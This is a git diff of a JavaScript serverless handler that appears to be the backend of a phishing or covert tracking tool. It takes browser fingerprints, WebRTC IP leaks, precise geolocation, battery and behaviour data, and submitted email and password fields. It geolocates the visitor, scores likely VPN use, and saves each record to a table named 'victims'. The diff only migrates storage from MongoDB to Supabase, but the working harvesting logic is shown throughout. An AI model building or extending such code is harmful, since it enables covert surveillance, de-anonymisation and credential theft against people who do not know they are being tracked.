@@ -9,7 +9,7 @@
 import bcrypt from 'bcryptjs';
 import UAParser from 'ua-parser-js';
 import crypto from 'crypto';
-import { getVictimsCollection, ensureIndexes } from './_mongodb.js';
+import { getSupabaseClient } from './_supabase.js';
 
 // Rate limiting storage (in-memory, resets on cold start)
 const rateLimitMap = new Map();
@@ -18,28 +18,23 @@ const RATE_WINDOW = 60 * 60 * 1000; // 1 hour in ms
 
 /**
  * Check rate limit for IP
- * @param {string} ip
- * @returns {boolean} true if allowed, false if rate limited
  */
 function checkRateLimit(ip) {
   const now = Date.now();
-  const key = ip;
 
-  if (!rateLimitMap.has(key)) {
-    rateLimitMap.set(key, { count: 1, resetTime: now + RATE_WINDOW });
+  if (!rateLimitMap.has(ip)) {
+    rateLimitMap.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
     return true;
   }
 
-  const limit = rateLimitMap.get(key);
+  const limit = rateLimitMap.get(ip);
 
   if (now > limit.resetTime) {
-    rateLimitMap.set(key, { count: 1, resetTime: now + RATE_WINDOW });
+    rateLimitMap.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
     return true;
   }
 
-  if (limit.count >= RATE_LIMIT) {
-    return false;
-  }
+  if (limit.count >= RATE_LIMIT) return false;
 
   limit.count++;
   return true;
@@ -47,8 +42,6 @@ function checkRateLimit(ip) {
 
 /**
  * Get client IP address from request
- * @param {Object} req
- * @returns {string}
  */
 function getClientIP(req) {
   return (
@@ -62,8 +55,6 @@ function getClientIP(req) {
 
 /**
  * Parse User Agent string
- * @param {string} userAgent
- * @returns {Object}
  */
 function parseUserAgent(userAgent) {
   const parser = new UAParser(userAgent);
@@ -84,12 +75,15 @@ function parseUserAgent(userAgent) {
 
 /**
  * Get geolocation from IP address
- * @param {string} ip
- * @returns {Promise<Object>}
  */
 async function getLocationFromIP(ip) {
-  // Skip for local IPs
-  if (ip === 'unknown' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === '::1' || ip === '127.0.0.1') {
+  if (
+    ip === 'unknown' ||
+    ip.startsWith('192.168.') ||
+    ip.startsWith('10.') ||
+    ip === '::1' ||
+    ip === '127.0.0.1'
+  ) {
     return {
       ip,
       city: 'Local',
@@ -105,9 +99,7 @@ async function getLocationFromIP(ip) {
   }
 
   try {
-    // Try ipapi.co first (1000 requests/day)
     const response = await fetch(`https://ipapi.co/${ip}/json/`);
-
     if (response.ok) {
       const data = await response.json();
       return {
@@ -125,9 +117,8 @@ async function getLocationFromIP(ip) {
       };
     }
 
-    // Fallback to ip-api.com (no rate limit for non-commercial)
+    // Fallback
     const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}`);
-
     if (fallbackResponse.ok) {
       const data = await fallbackResponse.json();
       return {
@@ -148,7 +139,6 @@ async function getLocationFromIP(ip) {
     console.error('Geolocation error:', error);
   }
 
-  // Return unknown location
   return {
     ip,
     city: 'Unknown',
@@ -164,9 +154,7 @@ async function getLocationFromIP(ip) {
 }
 
 /**
- * Generate unique fingerprint hash
- * @param {Object} data
- * @returns {string}
+ * Generate unique fingerprint hash (SHA-256)
  */
 function generateFingerprint(data) {
   const fingerprintData = [
@@ -177,8 +165,6 @@ function generateFingerprint(data) {
     data.timezoneInfo?.timezone || '',
     data.fingerprints?.canvas || '',
     data.fingerprints?.webgl?.renderer || '',
-    // Removed Date.now() to ensure same user gets same fingerprint
-    // This allows upsert to update existing record instead of creating duplicates
   ].join('|');
 
   return crypto.createHash('sha256').update(fingerprintData).digest('hex');
@@ -186,9 +172,6 @@ function generateFingerprint(data) {
 
 /**
  * Detect VPN usage
- * @param {Object} data
- * @param {Object} location
- * @returns {Object}
  */
 function detectVPN(data, location) {
   const detection = {
@@ -199,22 +182,18 @@ function detectVPN(data, location) {
     confidence: 'low',
   };
 
-  // Check timezone mismatch
   if (data.timezoneInfo?.timezone && location.timezone) {
     detection.timezoneMismatch = data.timezoneInfo.timezone !== location.timezone;
   }
 
-  // Check WebRTC leak
   if (data.webRTC?.publicIP && data.webRTC.publicIP !== location.ip) {
     detection.webRTCLeak = true;
   }
 
-  // Check suspicious ISP
   const vpnKeywords = ['vpn', 'proxy', 'datacenter', 'cloud', 'hosting', 'virtual'];
   const isp = location.isp?.toLowerCase() || '';
-  detection.suspiciousISP = vpnKeywords.some((keyword) => isp.includes(keyword));
+  detection.suspiciousISP = vpnKeywords.some((k) => isp.includes(k));
 
-  // Determine likelihood
   const indicators = [
     detection.timezoneMismatch,
     detection.webRTCLeak,
@@ -235,16 +214,13 @@ function detectVPN(data, location) {
  * Main handler
  */
 export default async function handler(req, res) {
-  // Only allow POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
   try {
-    // Get client IP
     const clientIP = getClientIP(req);
 
-    // Check rate limit
     if (!checkRateLimit(clientIP)) {
       return res.status(429).json({
         error: 'Rate limit exceeded',
@@ -252,101 +228,68 @@ export default async function handler(req, res) {
       });
     }
 
-    // Parse request body
     const data = req.body;
-
-    // Get location from IP
     const location = await getLocationFromIP(clientIP);
-
-    // Parse user agent
     const parsedUA = parseUserAgent(data.browser?.userAgent || req.headers['user-agent']);
-
-    // Generate fingerprint
     const fingerprint = generateFingerprint(data);
-
-    // Detect VPN
     const vpnDetection = detectVPN(data, location);
 
-    // Hash password (IMPORTANT: Never store plaintext passwords)
     let hashedPassword = null;
     if (data.metadata?.formData?.password) {
       hashedPassword = await bcrypt.hash(data.metadata.formData.password, 10);
     }
 
-    // Prepare victim document
-    const victimData = {
+    // Prepare flat row for Supabase (JSONB columns for nested data)
+    const victimRow = {
       fingerprint,
-      timestamp: new Date(),
-
+      timestamp: new Date().toISOString(),
       screen: data.screen || {},
-
-      browser: {
-        ...data.browser,
-        ...parsedUA.browser,
-      },
-
+      browser: { ...data.browser, ...parsedUA.browser },
       device: {
         ...data.device,
         isBot: /bot|crawler|spider/i.test(data.browser?.userAgent || ''),
       },
-
       os: parsedUA.os,
-
-      network: {
-        ...location,
-        vpnDetection,
-      },
-
-      timezoneInfo: data.timezoneInfo || {},
-
+      network: { ...location, vpnDetection },
+      timezone_info: data.timezoneInfo || {},
       fingerprints: data.fingerprints || {},
-
       geolocation: data.geolocation || null,
-
-      webRTC: data.webRTC || {},
-
+      web_rtc: data.webRTC || {},
       behavior: data.behavior || {},
-
       battery: data.battery || null,
-
       metadata: {
         userSubmitted: data.metadata?.userSubmitted || false,
         formData: {
           email: data.metadata?.formData?.email || null,
-          password: hashedPassword, // Hashed password
+          password: hashedPassword,
         },
       },
     };
 
-    // Save to database (upsert: insert if new, update if exists)
-    const collection = await getVictimsCollection();
-    await ensureIndexes(collection);
+    const supabase = getSupabaseClient();
 
-    // Use updateOne with upsert to either insert new or update existing
-    const result = await collection.updateOne(
-      { fingerprint }, // Find by fingerprint
-      { $set: victimData }, // Update with new data
-      { upsert: true } // Insert if doesn't exist
-    );
+    // Upsert: insert new or update existing record by fingerprint
+    const { data: result, error } = await supabase
+      .from('victims')
+      .upsert(victimRow, { onConflict: 'fingerprint' })
+      .select('id')
+      .single();
 
-    const isUpdate = result.matchedCount > 0;
+    if (error) throw error;
 
-    // Return success response
     return res.status(200).json({
       success: true,
-      message: isUpdate ? 'Data updated successfully' : 'Data captured successfully',
+      message: 'Data captured successfully',
       fingerprint,
       location: {
         city: location.city,
         country: location.country_name,
       },
       vpnDetection,
-      isUpdate,
-      upsertedId: result.upsertedId,
+      id: result?.id,
     });
   } catch (error) {
     console.error('Capture error:', error);
-
     return res.status(500).json({
       error: 'Internal server error',
       message: error.message,
